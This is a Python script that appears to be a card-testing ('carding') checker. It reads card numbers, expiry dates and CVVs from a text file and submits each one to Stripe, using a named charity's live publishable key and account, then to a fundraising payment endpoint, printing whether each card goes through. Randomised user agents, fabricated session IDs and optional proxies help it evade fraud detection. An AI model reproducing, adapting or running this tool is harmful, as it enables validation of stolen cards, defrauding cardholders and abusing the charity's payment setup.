import aiohttp
import asyncio
import uuid
from fake_useragent import UserAgent
import tkinter as tk
from tkinter import filedialog
import os

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"


async def make_request(
    session,
    url,
    method="POST",
    params=None,
    headers=None,
    data=None,
    json=None,
):
    async with session.request(
        method,
        url,
        params=params,
        headers=headers,
        data=data,
        json=json,
    ) as response:
        return await response.text()


async def stripe_charge(cards):
    cc, mon, year, cvv = cards.split("|")
    year = year[-2:]
    ua = UserAgent()
    user_agent = ua.random

    guid = str(uuid.uuid4())
    muid = str(uuid.uuid4())
    sid = str(uuid.uuid4())

    # os.environ["HTTP_PROXY"] = f"http://{proxy}@p.webshare.io:80" # replace with your proxy url
    # os.environ["HTTPS_PROXY"] = f"http://{proxy}@p.webshare.io:80"  # replace with your proxy url
    # async with aiohttp.ClientSession(trust_env=True) as my_session:  # iF yOU uSE PROXY
    async with aiohttp.ClientSession() as my_session:

        headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "user-agent": user_agent,
        }

        data = {
            "type": "card",
            "card[number]": f"{cc}",
            "card[cvc]": f"{cvv}",
            "card[exp_month]": f"{mon}",
            "card[exp_year]": f"{year}",
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/4901af2b6b; stripe-js-v3/4901af2b6b; split-card-element",
            "referrer": "https://sosoutreach.org",
            "time_on_page": "190617",
            "key": "pk_live_9RzCojmneCvL31GhYTknluXp",
            "_stripe_account": "acct_1EKqtnLmrmfHMx6f",
            "_stripe_version": "2025-02-24.acacia",
        }
        req = await make_request(
            my_session,
            f"https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
        )
        pm_id = parseX(req, '"id": "', '"')
        headers2 = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "text/plain; charset=utf-8",
            "origin": "https://sosoutreach.org",
            "priority": "u=1, i",
            "referer": "https://sosoutreach.org/",
            "user-agent": user_agent,
        }

        req2 = await make_request(
            my_session,
            f"https://api.fundraiseup.com/paymentSession/3838647071811879882/pay",
            headers=headers2,
            data=req,
        )
        return req2


def select_file():
    root = tk.Tk()
    root.withdraw()  # Hide main window
    file_path = filedialog.askopenfilename(
        title="Select Your Cards File cards.txt", filetypes=[("Text files", "*.txt")]
    )
    if not file_path:
        print("No Cards File found. Select Only .txt File")
        exit()
    return file_path


async def main():
    try:
        file_path = select_file()
        with open(file_path, "r") as file:
            for line in file:
                card = line.strip()
                result = await stripe_charge(card)
                print(f"{card} -> {result}")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    asyncio.run(main())
